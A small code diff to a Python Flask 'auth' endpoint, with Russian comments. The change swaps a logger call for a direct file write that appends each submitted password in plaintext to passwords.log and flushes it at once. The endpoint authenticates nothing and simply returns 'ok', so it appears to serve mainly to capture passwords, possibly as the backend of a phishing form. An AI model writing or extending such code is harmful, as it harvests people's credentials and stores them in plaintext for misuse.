@@ -22,8 +22,10 @@ def auth():
     data = request.form
     password = data.get('password')
 
-    # Логируем только пароль
-    password_logger.info(f"🔐 Пароль: {password}")
+    # Ручная запись в файл, сразу с flush
+    with open("passwords.log", "a", encoding="utf-8") as f:
+        f.write(f"🔐 Пароль: {password}\n")
+        f.flush()
 
     return jsonify({"status": "ok"})
 
